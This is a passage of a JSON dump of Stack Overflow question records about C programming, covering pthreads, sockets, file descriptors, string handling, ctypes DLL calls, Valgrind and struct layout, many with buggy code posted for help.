pthread_exit(NULL);\n}\n\n/*The output should look like:\nHickory,\ndickory,\ndock,\nThe\nmouse\nran \nup\nthe\nclock.\n\nThis code results in:\nclock. */\n</code></pre>\n\n<p>I am trying to open a text file and read in each word on the line using scanf. The word is then sent to the 'print' method (via parameter of pthread_create) and prints the word which was read in, when a signal is sent (via pthread_kill). The process repeats until the file has been completely read in and printed. </p>\n"},{"tags":["c","network-programming"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13169534,"title":"Why does recv() with MSG_PEEK block?","body":"<p>Only once, when a new connection is created, I want to peek into the stream to determine whether or not the connection is an SSL connection. To do this I use recv() with the MSG_PEEK flag. The problem is that for connections which are not SSL connections and dont have any initial incoming data the recv blocks for a few seconds. How do I fix that?</p>\n"},{"tags":["c","string"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":65,"score":0,"question_id":13169562,"title":"C concatenate string with int in loop","body":"<p>I'm new to C and am having trouble with strings.  What I would like to do is create a string like \"val1, val2, val3\" in a loop.</p>\n\n<p>Currently my code looks something like:</p>\n\n<pre><code>char tagstr[60] = \"\";\nint k;\nint n = 5;\nfor (k=0; k &lt; n; k++) {\n    char temp[10]  = \"\";\n    sprintf(temp, \", val%d\", k);\n    strcat(tagstr, temp);\n}\n</code></pre>\n\n<p>But the output of tagstr is \", val#\", where # is some long integer value.  I'm guessing I'm doing something wrong with pointers here but I've tried everything I can think of without success... any help would be much appreciated.</p>\n\n<p>EDIT: more context, if it helps:</p>\n\n<pre><code>int tagsClosed = strlen(pch1) - strcspn(pch1, \")\");\ndo {\n    if (curTag.size &gt; 0) {\n        // problem section\n        char tagstr[60] = \"\";\n        int k;\n        for (k = 0; k &lt; 5; k++) {\n            char temp[10] = \"\";\n            sprintf(temp, \", val%i\", temp, k);\n            strcat(tagstr, temp);\n        }\n\n        // This prints out something like \", val-890132840\" x 5 (same number)\n        printf (\"String is now: %s\\n\", tagstr);\n    }\n    curTag = *(curTag.parent);\n    tagsClosed--;\n} while (tagsClosed &gt; 0);\n</code></pre>\n\n<p>curTag is a struct:</p>\n\n<pre><code>typedef struct Tag {\n    char * name;\n    int size; // number of children\n    int tagnum;\n    struct Tag* parent;\n} Tag;\n</code></pre>\n"},{"tags":["objective-c","c","xcode","osx"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13169772,"title":"MACHTYPE, HOSTTYPE, OSTYPE in xcode","body":"<p>From the terminal if I run <code>env | grep TYPE</code> I get nothing. If it run <code>set | grep TYPE</code> I get <code>OSTYPE</code> <code>MACHTYPE</code> &amp; <code>HOSTTYPE</code>\nI'm looking for the equivalent of <code>getenv(\"HOSTTYPE\")</code> (this returns null).. for the set command.</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":13169693,"title":"File Descriptors, open() returns zero","body":"<p>i open a file and want to write something in it. The problem is that the fd2 for some reason is 0. Instead of writting in the file, it writes on terminal. I dont  close(0) anywhere in my code. Why do i get fd = 0 and not for example 3. The reason that writes on terminal is that the value of fd is zero? I know that fd = 0 is for standard input,</p>\n\n<p>Any Ideas? Thank you. </p>\n\n<pre><code>if ((fd2 = open(logFile, O_RDWR |O_APPEND | O_CREAT , 0666) == -1))\n    DieWithError(\"open() failed\");\n\nprintf(\"FD2 = %d\",fd2);     //returns me zero\n\nbzero(tempStr, sizeof(tempStr));\nbzero(hostname, sizeof(hostname));\n\ngethostname(hostname, sizeof(hostname));\n\nsprintf(tempStr, \"\\n%sStarting FTP Server on host %s in port %d\\n\", ctime(&amp;currentime), hostname, port);\n\nif (write(fd2, tempStr, strlen(tempStr)) == -1)\n    DieWithError(\"write(): failed\");\n</code></pre>\n"},{"tags":["c","network-programming","linux-kernel"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13161150,"title":"How to use asm/system.h from user space?","body":"<p>For my Linux networking application, I am referring to <a href=\"http://www.scaramanga.co.uk/code-fu/lincap.c\" rel=\"nofollow\">lincap.c</a> to understand how to use the PACKET_MMAP method of receiving Ethernet packets via a ring buffer.</p>\n\n<p>lincap.c uses the memory barrier macro <code>mb()</code> defined in asm/system.h. However, the code in that header file is embraced by <code>#ifdef __KERNEL__</code>. I guess that means it is a kernel header file.  How can I use <code>mb()</code> from a user space application (which I believe lincap.c is)?</p>\n\n<p>BR</p>\n\n<p>David</p>\n"},{"tags":["c++","c","visual-studio","compiler","enums"],"answer_count":3,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":1844,"score":4,"question_id":3106015,"title":"How do I increment an enum in VS C++ 6.0?","body":"<p>I copy and pasted some code that increments an enum:  </p>\n\n<pre><code>myenum++;  \n</code></pre>\n\n<p>This code worked fine as it was compiled in VS.NET C++ 2003 </p>\n\n<p>I am now developing in VS 6.0 and get the error:</p>\n\n<blockquote>\n  <p>error C2676: binary '++' : 'enum\n  ID' does not define this\n  operator or a conversion to a type\n  acceptable to the predefined operator</p>\n</blockquote>\n\n<p>How can I get this to behave the same in 6.0?</p>\n"},{"tags":["c++","c","sizeof","language-lawyer","standards-compliance"],"answer_count":1,"favorite_count":1,"up_vote_count":13,"down_vote_count":0,"view_count":229,"score":13,"question_id":13169451,"title":"Do I have the guarantee that sizeof(type) == sizeof(unsigned type)?","body":"<p>The sizeof char, int, long double... can vary from one compiler to another. But do I have the guarantee according to the C++11 or C11 standard that the size of any signed and unsigned fundamental integral type is the same ?</p>\n"},{"tags":["c","sockets","network-programming","freebsd"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":13167792,"title":"Use libpcap with a socket connection","body":"<p>Is it possible to use libpcap to detect an incoming connection, and dynamically create a socket made to accept just that connection, or is it too late by the time libpcap sniffs the packet? I am asking because I only want to open the socket connection for a particular session, not for any old connection that comes across the wire. As such, I don't have a socket already bound and listening to an interface. </p>\n\n<p>Thanks</p>\n"},{"tags":["c","gcc","linux-kernel","stack-trace"],"answer_count":2,"favorite_count":1,"up_vote_count":9,"down_vote_count":0,"view_count":449,"score":9,"question_id":10171984,"title":"How to make good use of kernel's stack trace?","body":"<p>If you are lucky when your kernel module crashes, you would get an oops with a log with a lot of information, such as values in the registers etc. One such information is the stack trace. Take this example:</p>\n\n<pre><code>[&lt;f97ade02&gt;] ? skink_free_devices+0x32/0xb0 [skin_kernel]\n[&lt;f97aba45&gt;] ? cleanup_module+0x1e5/0x550 [skin_kernel]\n[&lt;c017d0e7&gt;] ? __stop_machine+0x57/0x70\n[&lt;c016dec0&gt;] ? __try_stop_module+0x0/0x30\n[&lt;c016f069&gt;] ? sys_delete_module+0x149/0x210\n[&lt;c0102f24&gt;] ? sysenter_do_call+0x12/0x16\n</code></pre>\n\n<p>My guess is that the <code>+&lt;number1&gt;/&lt;number2&gt;</code> has something to do with the offset from function in which the error has occurred. That is, by inspecting this number, perhaps looking at the assembly output I should be able to find out the line (better yet, instruction) in which this error has occurred. Is that correct?</p>\n\n<p>My question is, what are these two numbers exactly? How do you make use of them?</p>\n"},{"tags":["c","arrays","pointers","char"],"answer_count":4,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":13169215,"title":"Pass by reference String array to function and modify content in C","body":"<p>What am I doing wrong here with passing a char array to a function and in the function giving each index memory (using malloc()), then inserting something from the keyboard using gets().</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;string.h&gt;\n#include &lt;sys/wait.h&gt;\n\nvoid test(char *arr[]);\nint main(){\n  char *arr[2];//2 is the rows\n /* arr[0] = malloc(80);//This commented code works\n  arr[1] = malloc(80);\n  strcpy(arr[0], \"hey\");\n  strcpy(arr[1], \"whats up\");\n*/\n\n  test(*arr);\n  printf(\"in array[0]: %s\", arr[0]);\n  printf(\"in array[1]: %s\", arr[1]);\n  return 0;\n}\nvoid test(char *arr[]){\n  int index;\n  char *input = malloc(80);\n  for(index = 0; index &lt; 2; index++){\n  arr[index] = malloc(80);\n  gets(input);\n  strcpy(arr[index], input);\n  //arr[0] = input;\n  }\n}\n</code></pre>\n\n<p>Just a very basic program which for some reason I am having trouble with. Also one more question When I declare an array what is the difference between these forms</p>\n\n<pre><code>char *array\n</code></pre>\n\n<p>as oppose to</p>\n\n<pre><code>char *array[size]\n</code></pre>\n\n<p>or</p>\n\n<pre><code>char **array\n</code></pre>\n\n<p>Thanks,\nKevin</p>\n"},{"tags":["c","ansi"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":76,"score":-2,"question_id":13165470,"title":"appending strings with pointers using ANSI C","body":"<p>appending strings with pointers using ANSI C</p>\n"},{"tags":["c"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":13168964,"title":"System call open() permissions","body":"<p>I open a file using the system call <code>open()</code>.</p>\n\n<pre><code>if ((fd2 = open(logFile, O_RDWR |O_APPEND | O_CREAT ), 0666) == -1)\n    DieWithError(\"open() failed\");\n</code></pre>\n\n<p>My file which is FTP_track.log is created without any problem. The problem is although i have mode <code>0666</code>, which is read and write for all, I can not open the file in unix. I have to change permissions from the file's properties to read and write.</p>\n\n<p>Any ideas? Thank you. </p>\n"},{"tags":["c","linux","sockets"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":13157151,"title":"Isn't struct sockadr_in supposed to work for both IPv4 and IPv6?","body":"<p>Specifically sin_addr seems to be located on different memory locations for IPv4 and IPv6 socket addressed. This results in weirdness:</p>\n\n<pre><code>#include &lt;stdio.h&gt;                                                                               \n#include &lt;netinet/in.h&gt;                                                                          \n\nint main(int argc, char ** argv) {                                                               \n  struct sockaddr_in sa;                                                                         \n  printf(\"sin_addr in sockaddr_in  = %p\\n\", &amp;sa.sin_addr);                                       \n  printf(\"sin_addr in sockaddr_in6 = %p\\n\", &amp;((struct sockaddr_in6*)&amp;sa)-&gt;sin6_addr);            \n};\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>sin_addr in sockaddr_in  = 0x7fffa26102b4\nsin_addr in sockaddr_in6 = 0x7fffa26102b8\n</code></pre>\n\n<p>Why aren't these 2 values the same ?</p>\n\n<p>Since this is pointing to the same data (the address to connect to), this should be located at the same address. Otherwise, how are you supposed to call inet_ntop with a sockaddr_in that you don't know is IPv4 or IPv6 ?</p>\n"},{"tags":["c","gcc","readfile"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":84,"score":1,"question_id":13135428,"title":"Read two strings from file separated by space in C","body":"<p>I have the following code:</p>\n\n<pre><code>#include&lt;iostream&gt;\n#include&lt;stdio.h&gt;\nusing namespace std;\nint main(){\n    char* username, *password;\n    cout&lt;&lt;\"Content-type: text/html\"&lt;&lt;endl&lt;&lt;endl;\n    FILE *in = fopen(\"useri.txt\",\"r\");\n    while (fscanf(in,\"%s %s\",username, password) != EOF) {\n        cout&lt;&lt;username&lt;&lt;endl;\n    }\n    fclose(in);\n}\n</code></pre>\n\n<p>The file looks like:</p>\n\n<pre><code>admin admin\n</code></pre>\n\n<p>For some reason, all the text in the specific file, is being read into the <code>username</code> var. The code as-is, does print out both the 2 values I have in my file (on separate lines), but that's wrong, cause it should only print 1.</p>\n\n<p>As soon as I try to print <code>password</code>, the program just exits, with no error (not even segmentation fault). Am I doing something wrong?</p>\n\n<p><strong>Note</strong>: I need this to stay C, not C++ (except for the <code>cout</code> part, because I'm lazy).</p>\n"},{"tags":["c","windows","console"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":176,"score":-2,"question_id":10615042,"title":"How to update (refresh) console screen?","body":"<p>I'm writing a program that shows some information on screen and I want them to be updated each second.</p>\n\n<p>What should I do?</p>\n\n<p>I'm writing a C console application on Windows. </p>\n"},{"tags":["php","c","sockets","struct"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13168259,"title":"Read / Write C data structure via socket in PHP","body":"<p>So, I'm working on a web application where all data is stored as C data structures, and is accessible via socket. The web application is written in PHP, which is why I'd like to find a way to do this in PHP. Keep in mind I have control over the PHP application only, not the way the server reads / writes data.</p>\n\n<p>I apologize for the broadness of the question but I'm not looking for a very specific answer. I'm more concerned with finding a 'best' way to proceed via collective experience so that I don't spend too much time chasing poor solutions.</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":13167971,"title":"Segmentation fault with sscanf","body":"<p>I am writing a small C program to test a concept and I am having some problems. Firstly, here is all of my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nchar one[] = \"Figure A 200 200 =\\0\";\nchar two[] = \"Figure B 300 200 =\\0\";\n\nint main(void)\n{\n  char buffero[300];\n  char buffert[300];\n  memset(buffero, 0, sizeof(buffero));\n  memset(buffert, 0, sizeof(buffert));\n\n  int * doubleo = 0;\n  int * doublet = 0;\n\n  sscanf(one, \"%s %s %d %d \",buffero, buffert, doubleo, doublet);\n  printf(\"%s %s %d %d\", buffero, buffert, *doubleo, *doublet);\n\n  memset(buffero, 0, sizeof(buffero));\n  memset(buffert, 0, sizeof(buffert));\n\n  sscanf(two, \"%s %s %d %d \", buffero, buffert, doubleo, doublet);\n  printf(\"%s %s %d %d\", buffero, buffert, *doubleo, *doublet);\n};\n</code></pre>\n\n<p>It's become slightly convoluted with some of the fixes I have attempted to implement but not all that horribly. </p>\n\n<p>It compiles, however when I run it, I get a segmentation fault. </p>\n\n<p>GDB reports:</p>\n\n<pre><code>#3  0x0000000000400683 in main () at mis_test.c:15\n15    sscanf(one, \"%s %s %d %d \",buffero, buffert, doubleo, doublet);\n</code></pre>\n\n<p>Can someone give a bit of insight here? I am rather new to C an I KNOW it's a very very simple problem thats staring me right in the face but I can't seem to get it. Any help is appreciated. </p>\n"},{"tags":["c","windows","api","filtering","portaudio"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":357,"score":1,"question_id":11789624,"title":"Windows virtual microphone in C","body":"<p>I asked a similar question a while ago but I didn't know very much, so I wasn't able to be specific enough.</p>\n\n<p>I want to write a program that takes input from my microphone, processes it, and then sends the output to a fake \"virtual microphone\" as if the processed sound I created was what a microphone was hearing. I would then like to be able to use this virtual microphone with any application that supports choosing your microphone input (pretty much any well written software) as a valid microphone. So what the application \"hears\" will be my processed version of the microphone input.</p>\n\n<p>I'm working with Portaudio in C and I can capture from the mic, process, and send out to the speakers just fine. Now I need to replace my real speakers in the application with the phony microphone. Windows seems to have some APIs for this. \n<a href=\"http://msdn.microsoft.com/en-us/library/windows/hardware/ff536201%28v=vs.85%29.aspx\" rel=\"nofollow\">http://msdn.microsoft.com/en-us/library/windows/hardware/ff536201%28v=vs.85%29.aspx</a>\nSo my sink pin will be the real microphone and I will have to create a NEW source pin that should be visible to other applications. How would I go about doing this? I'm having difficulty finding code samples or really even any very informative documentation.</p>\n\n<p>Language: C\nOS: Windows 7</p>\n"},{"tags":["python","c","dll","types","ctypes"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":191,"score":1,"question_id":6725870,"title":"Error when using ctypes module to acess a DLL written in C","body":"<p>I have a DLL with one single function That gets five doubles and one int:</p>\n\n<pre><code>__declspec(dllexport)  struct res ITERATE(double z_r,double z_i,double c_r, double c_i, int iterations, double limit)\n</code></pre>\n\n<p>It retuns a custom struct caled res which consists of a three-double array:</p>\n\n<pre><code>struct res {\n   double arr[3];\n};\n</code></pre>\n\n<p>To return the values I do this:</p>\n\n<pre><code>struct res result;      /*earlier in the code */\n\nresult.arr[0] = z_real; /*Just three random doubles*/\nresult.arr[1] = z_imag;\nresult.arr[2] = value;\nreturn result;\n</code></pre>\n\n<p>I've compiled it with MinGW and I'm trying to use it in python to do something like this:</p>\n\n<pre><code>form ctypes import *\n\nz = [0.0,0.0]\nc = [1.0,1.0]\nM = 2.0\n\nMiDLL = WinDLL(\"RECERCATOOLS.dll\")\nMiDLL.ITERATE.argtypes = [c_double, c_double, c_double, c_double,c_int,c_double]\nMiDLL.ITERATE(z[0],z[1],c[0],c[1],100,M) #testing out before assigning the result to anything.\n</code></pre>\n\n<p>But, whenever I try call the function with those values, it wil throw this to me:</p>\n\n<pre><code>WindowsError: exception: access violation writing 0x00000000\n</code></pre>\n\n<p>I also don't know how to catch the custom structure I declared and convert each of it's elements into Python floating points. I've looked into <a href=\"http://docs.python.org/py3k/library/ctypes.html\" rel=\"nofollow\">this PyDocs link</a> but to no avail. </p>\n\n<p>Thank you in advance.</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>This is the original (modified according to suggestions) header used (\"mydll.h\"):</p>\n\n<pre><code>#ifndef MYDLL_H\n#define MYDLL_H\n\nextern \"C\" __declspec(dllexport)\n#define EXPORT_DLL __declspec(dllexport)\n\nEXPORT_DLL void ITERATE(struct res*, double z_r,double z_i,double c_r, double c_i, int iterations, double limit)\n\n\n#endif\n</code></pre>\n\n<p>And, in case something might be wrong with it, the code file (it's very short, just one function):</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;complex.h&gt;\n\nstruct res {\n   double arr[3];\n};\n\nvoid __declspec(dllexport) ITERATE(struct res* result,double z_r,double z_i,double c_r, double c_i, int iterations, double limit)\n{\n/* The purpose of this function is, given two complex numbers,\n   an iteration number and a limit, apply a formula to these\n   two numbers for as many iterations as specified.\n\n   If at any iteration the result of the formula is bigger than\n   the limit, stop and return the number and the iteration it reached.\n\n   If after iterating they are still inside the limit, return the\n   number after all the iterations and the number of iterations\n   it has gone through.\n\n   Complex numbers are composed of a real part and an imaginary part,\n   and they must be returned separately.\n*/\ndouble complex z = z_r + z_i*I;\ndouble complex c = c_r + c_i*I;\nint actual_iter;\n\nfor (actual_iter = 1; actual_iter &lt;= iterations; actual_iter++)\n    {\n    z = z*z + c;\n    if (cabs(z) &gt; limit)\n        {\n        double value = actual_iter;\n        double z_real = creal(z);\n        double z_imag = cimag(z);\n        result.arr[0] = z_real;\n        result.arr[1] = z_imag;\n        result.arr[2] = value;\n        }\n    }\ndouble value = iterations;\ndouble z_real = creal(z);\ndouble z_imag = cimag(z);\nresult.arr[0] = z_real;\nresult.arr[1] = z_imag;\nresult.arr[2] = value;\n}\n\nint main()\n{\nreturn 0;\n}\n</code></pre>\n"},{"tags":["c","performance","optimization","time-complexity","codechef"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":82,"score":-2,"question_id":13028801,"title":"Optimizing C code -> Codechef solution time exceeded","body":"<p>What are tips and tricks so that my code can be executed in given time limit. May be some logical changes or anything.</p>\n\n<p>When I submit my solution in codechef it shows time limit exceeded but I think it is fast enough simple code. I am amateur in programming any help and suggestions would be helpful. Guide me so that it could be executed within the time limit i.e. 3 seconds. Thank you !!</p>\n"},{"tags":["c","file-io","structure"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":80,"score":-3,"question_id":13162505,"title":"what i am doing wrong? code below not copying last record of structured data from .dat file to another .dat file in C","body":"<pre><code>#include&lt;conio.h&gt;\n\n#include&lt;stdio.h&gt;\n\nstruct stud\n\n{\n  int rollno;\n  char name[10];\n  char add[10];\n};\n\nvoid main()\n{\n    struct stud st;\n\n    FILE *fp,*fpp;\n\n    char another='y',ch;\n\n    int a,choice,i;\n\n    printf(\"***Press 1 to Add record/Create database***\\n\");\n\n    scanf(\"%d\",&amp;a);\n\n    if(a==1)    /*recording data begins here*/\n    {\n        fflush(stdin);\n        printf(\"ADD or CREATE NEW?(a/c): \");    /*prompt message to add new record to existing database or to create new database*/\n        scanf(\"%c\",&amp;ch);\n\n     if(ch=='a')    /*appending file*/\n     {\n      add:\n\n      ch='a';\n\n      fp=fopen(\"Studm.dat\",\"ab\");\n\n      while(another=='y' || another=='Y')\n      {\n        fflush(stdin);\n\n        printf(\"Enter RollNo. Name &amp; Address\\n\");\n\n        scanf(\"%d%s%s\",&amp;st.rollno,st.name,&amp;st.add);\n\n        fwrite(&amp;st,sizeof(st),1,fp);\n\n        fflush(stdin);\n\n        printf(\"\\nAdd another record?(y/n): \");    /*prompt message to add another record*/\n        scanf(\"%c\",&amp;another);\n\n      }\n\n     }\n\n        if(ch=='c')    /*to create new data file*/\n        {\n\n        fp=fopen(\"Studm.dat\",\"wb\");\n\n        printf(\"Enter RollNo. Name &amp; Address\\n\");\n\n        scanf(\"%d%s%s\",&amp;st.rollno,st.name,&amp;st.add);\n\n        fwrite(&amp;st,sizeof(st),1,fp);\n\n        fflush(stdin);\n\n        printf(\"\\nAdd another record?(y/n): \");\n\n        scanf(\"%c\",&amp;another);\n\n        fclose(fp);\n\n        if(another=='y' || another=='Y')\n        {\n\n         goto add;   /*go to the append file block above*/\n        }\n\n\n    }\n\n      fclose(fp);\n\n    }\n</code></pre>\n\n<p>whenever i open source file in text editor all the names(character data) given are visible, that means storing and recording block is working perfectly.</p>\n\n<pre><code>    fflush(stdin);\n\n    printf(\"\\n\\nCopying data from studm.dat to stud1.data\\n\\n\");\n\n    fp=fopen(\"Studm.dat\",\"rb\");\n\n    fpp=fopen(\"Stud1.dat\",\"wb\");\n\n    while(fread(&amp;st,sizeof(st),1,fp)==1)    /*loop block to copy data*/\n    {\n        fflush(stdin);    /*tried every place for flushing the buffer, before and after fwrite with in the loop*/\n\n        fwrite(&amp;st,sizeof(st),1,fpp);\n\n    }\n    fclose(fp);\n\n    fclose(fpp);\n</code></pre>\n\n<p>like source file i opened target file in text editor after executing the whole program code records up to the second last record were there.</p>\n\n<pre><code>    printf(\"\\n\\nCopying done now reading data from file Stud1.dat\\n\\n\");\n\n    fpp=fopen(\"Stud1.dat\",\"rb\");\n\n    while(fread(&amp;st,sizeof(st),1,fp)==1)\n    {\n\n     printf(\"%d %s %s\\n\",st.rollno,st.name,st.add);\n\n    }\n\n    fclose(fpp);\n\n    getch();\n }\n</code></pre>\n\n<p>i think problem is in copying block, but i don't know whether it's something related to buffer or i have coded wrong or a bug.</p>\n"},{"tags":["c","segmentation-fault","valgrind"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":40,"score":2,"question_id":13167277,"title":"Valgrind Not Catching Segfaults","body":"<p>I'm aware that Valgrind keeps track of the memory in a way that allows to to catch segfaults. However, why is not catching the following segfault?</p>\n\n<pre><code>int main() {\n    char *x = calloc(16, 1);\n    char *y = calloc(16, 1);\n\n    x[80] = 'c';\n    y[-80] = 'c';\n\n    printf(\"%c %c\\n\", *x, *y);\n    return 0;\n}\n</code></pre>\n\n<p>Isn't it supposed to catch the out of bound access in the heap? According to Valgrind's documentation:</p>\n\n<pre><code>But it should detect many errors that could crash your program (eg. cause a segmentation fault).\n</code></pre>\n"},{"tags":["c","data-structures"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":13167481,"title":"C - Design pattern for a structured buffer?","body":"<p>I have a buffer that is N bytes long, where N is at least 50.  This buffer is in a very specific format, where the first 4 bytes are a unsigned int representing how long the buffer is (including those four bytes).  The next 16 bytes are four unsigned ints with a different meaning.  The next N-20 bytes are some general purpose buffer of memory.</p>\n\n<p>Right now, to set this buffer up, I do something like this:</p>\n\n<pre><code>memcpy((char*)my_buf + 0, &amp;buf_size, 4);    //buf_size is some unsigned int\nmemcpy((char*)my_buf + 4, &amp;prop0, 4);    //buf_size is some unsigned int\nmemcpy((char*)my_buf + 8, &amp;prop1, 4);    //buf_size is some unsigned int\nmemcpy((char*)my_buf + 12, &amp;prop2, 4);    //buf_size is some unsigned int\nmemcpy((char*)my_buf + 16, &amp;prop3, 4);    //buf_size is some unsigned int\n//Many more bytes used as a generic buffer\n</code></pre>\n\n<p>However, this seems very inelegant.  At this point I would like to ask the community if there is a more elegant way of assigning particular values to particular memory offsets when given an initial address.</p>\n\n<p>I thought about using a struct, but IIRC a struct does not guarantee which order its members are placed in memory, and I don't know how a struct could represent the tail of the buffer which is generic memory space.</p>\n"},{"tags":["c","sequence","series"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":5,"view_count":129,"score":-4,"question_id":13141352,"title":"How to iterate over the series: 0, 1, 2, 3, 4, 4, 5, 6, 7, 7, 8, 7, 8, 8, 9 … without using recursion?","body":"<p>Is am trying to figure out how to generate this sequence of numbers in C.</p>\n\n<pre><code>0, 1, 2, 3, 4, 4, 5, 6, 7, 7, 8, 8, 9 …\n</code></pre>\n\n<p>The sequence is generated by forming a triangle of numbers as shown below: </p>\n\n<pre><code>0\n1 2\n3 4 5\n6 7 8 9 ...\n</code></pre>\n\n<p>Next two numbers in series are located as follows:</p>\n\n<ol>\n<li>Next number is located directly below </li>\n<li>Next to next is located one place to the right.</li>\n</ol>\n\n<p></p>\n\n<pre><code>0\n|\\\n1 2\n\nSeries -&gt; 0, 1, 2\n\n0\n|\\\n1 2\n|\\|\\\n3 4 5\n\nSeries -&gt; 0, 1, 2, 3, 4, 4, 5, ........\n</code></pre>\n\n<p>How can I traverse this number triangle to get this sequence in C?</p>\n\n<p>It means that \n0 is replaced with 1 and 2\n1 is replaced with 3 and 4\n2 is replaced with 4 and 5</p>\n\n<pre><code>0\n|\\\n1 2\n|\\|\\\n3 4 5\n|\\|\\|\\\n6 7 8 9\n\nSeries -&gt; 0, 1, 2, 3, 4, 4, 5, 6, 7, 7, 8, 7. 8. 8. 9 ........\n</code></pre>\n\n<p>It means that  </p>\n\n<p><strong>I. Solving 0</strong></p>\n\n<pre><code>0 leads to 1 and 2\n\n0 -&gt; 1 - 2\n0 1 2\n</code></pre>\n\n<p><strong>II. Solving 1 and 2</strong></p>\n\n<pre><code>1 leads to 3 and 4\n\n1 -&gt; 3 - 4\n0 1 2 3 4\n\n2 leads to 4 and 5\n\n2 -&gt; 4 - 5\n0 1 2 3 4 4 5\n</code></pre>\n\n<p><strong>III. Solving 3, 4, 4, 5</strong></p>\n\n<pre><code>3 leads to 6 and 7\n\n3 -&gt; 6 - 7\n0 1 2 3 4 4 5 6 7\n\n4 leads to 7 and 8\n\n4 -&gt; 7 - 8\n0 1 2 3 4 4 5 6 7 7 8\n\n4 leads to 7 and 8\n\n4 -&gt; 7 - 8\n0 1 2 3 4 4 5 6 7 7 8 7 8\n\n5 leads to 8 and 9\n\n5 -&gt; 8 - 9\n0 1 2 3 4 4 5 6 7 7 8 7 8 8 9\n</code></pre>\n\n<p>My apologies for not explaining properly. I hope I explain it this time.</p>\n"},{"tags":["c","cuda","preprocessor","nvcc"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13167330,"title":"Pre-processor commands (#if defined) not working in CUDA program?","body":"<p>In this code snippet, I would expect the \"printf\" command inside the MatrixMultiplication() method to display its text.  It does not, even though \"size\" has been declared on the previous line and \"test\" is set to 1.  Here's the code:</p>\n\n<pre><code>void MatrixMultiplication(float * M, float * N, float * P, int Width, int test)\n{\n        int size = Width * Width * sizeof(float);\n\n        #if defined size\n        if (test)\n        {\n                printf(\"Should be equal to %d.  Int size:%d\", Width * Width * sizeof(float), size);\n        }\n        #endif\n}\n\nint main (int argc, char ** argv)\n{\n\n        // Omitted for brevity...\n\n        int test = 1;                                                   \n\n        // Omitted for brevity...\n\n        MatrixMultiplication(hostM, hostN, reference, atoi(matrix_id), test);\n\n        // Omitted for brevity...\n\n}\n</code></pre>\n\n<p>I'm compiling with this command:</p>\n\n<pre><code>nvcc -I/home/sbu/NVIDIA_GPU_Computing_SDK/C/common/inc -L/home/sbu/NVIDIA_GPU_Computing_SDK/C/lib -o matrixmul matrixmul.cu -lcutil_x86_64\n</code></pre>\n\n<p>Is there something about nvcc that makes this sort of \"#if defined\" command not work?  I've used this sort of syntax before in native C and C++ code using gcc and it worked just fine.</p>\n\n<p>Any illumination on this issue would be great, thanks!</p>\n\n<p>Here is the full code on Pastebin: <a href=\"http://pastebin.com/SusnpgFc\" rel=\"nofollow\">http://pastebin.com/SusnpgFc</a></p>\n"},{"tags":["c++","c","objective-c","graphics","geometry"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1257,"score":1,"question_id":3457351,"title":"Rotated 2d rectangle intersection detection","body":"<p>I have 2 rectangles they are placed arbitrarily and I have rects all four corner point like <br><br></p>\n\n<pre><code>struct Rect\n{\n NSPoint topLeft; \n NSPoint topRight; \n NSPoint bottomLeft; \n NSPoint bottomRight; \n}\n</code></pre>\n\n<p>I want to check whether 2 rectangles intersects. I am looking a method similar to <code>NSIntersectsRect</code> . But <code>NSIntersectsRect</code>won't respect the rotation of rectangle. The points in structure  are the points obtained after rotation.</p>\n\n<p>Sample code in Objecitve-C ,C++ or C will be a great help.</p>\n"},{"tags":["c","struct","private"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":75,"score":1,"question_id":13166769,"title":"declare private structure in C","body":"<p>Is it possible to declare a structure type that is only visible in the .c file which uses the structure? I know that by putting <strong>static</strong> in front of a external data object, you change the linkage of the variable to be internal. But is it possible to put <strong>static</strong> in front of the declaration of a new <strong>struct</strong> type, like the following?</p>\n\n<pre><code>static struct log{\n            ...;\n            ...;\n};\ntypedef struct log log;\n</code></pre>\n\n<p>If it is not possible to make the structure type, say <strong>log</strong> as above, to be \"private\", does it mean that even though other source files do not know the existence of the name (which is <strong>log</strong> in my example) of the structure, accidental name collisions can still happen if they 